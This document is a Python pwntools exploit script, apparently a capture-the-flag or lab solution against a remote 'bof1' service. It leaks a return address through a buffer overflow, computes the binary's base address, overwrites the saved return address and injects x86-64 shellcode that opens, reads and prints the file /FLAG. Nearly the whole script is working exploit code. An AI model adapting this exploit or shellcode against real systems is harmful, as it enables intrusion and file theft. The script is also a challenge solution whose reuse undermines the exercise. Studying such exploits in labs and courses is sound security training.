from pwn import *

context.binary = './bof1'
elf = context.binary
context.terminal = ['tmux', 'splitw', '-h']

# p = process()
p = remote('up.zoolab.org', 12342)

# Step 1: Read banner
banner = p.recvuntil(b"What's your name? ")
print(repr(banner))

# Step 2: Leak return address via buf1
payload1 = b"A" * 56
p.send(payload1)

# 接收 "Welcome, AAAAA..."\n"What's the room number?"
response = p.recvuntil(b"What's the room number?")
print(repr(response))

# Extract ret address
leak = response.split(b"Welcome, ")[-1][56:56+6] + b"\x00\x00"
ret_addr = u64(leak)
log.success(f"Leaked return address: {hex(ret_addr)}")

# Step 3: Compute base and msg address
main_offset = elf.symbols['main']
msg_offset = elf.symbols['msg']
main_addr = ret_addr - 198
base_addr = main_addr - main_offset
msg_addr = base_addr + msg_offset
log.success(f"Main address: {hex(main_addr)}")
log.success(f"Base address: {hex(base_addr)}")
log.success(f"msg address:  {hex(msg_addr)}")

# Step 4: Send buf2 (overwrite return address)
payload2 = b"B" * 104 + p64(msg_addr)
p.send(payload2)

# print(f"[+] Attach to PID: {p.pid}")
# pause()  # <<<<<<<<<<<<<< 這邊最合適！

# Read next prompt
prompt3 = p.recvuntil(b"customer's name? ")
print(repr(prompt3))

# Step 5: Dummy buf3
p.send(b"C" * 8)

# Read next prompt
prompt4 = p.recvuntil(b"Leave your message: ")
print(repr(prompt4))

# Step 6: Send shellcode
shellcode = asm("""
    /* openat */
    mov rax, 257
    mov rdi, -100
    lea rsi, [rip + path]
    xor rdx, rdx
    syscall

    mov rdi, rax
    lea rsi, [rsp + 100]
    mov edx, 64
    xor eax, eax
    syscall

    mov rdi, 1
    mov rax, 1
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall

path:
""") + b"/FLAG\x00"



# 這邊先 pause，讓 GDB 可以看到 msg 內容還是空的
log.info("Ready to send shellcode")
# pause()


p.send(shellcode)

log.info("Shellcode sent, check msg")
# pause()


# Receive final message (e.g., Thank you!)
try:
    final = p.recvline(timeout=1)
    print(final.decode(errors="ignore"))

except:
    print("[!] No final response (maybe jumped to shellcode)")

# Switch to interactive mode (to see FLAG if printed)
p.interactive()
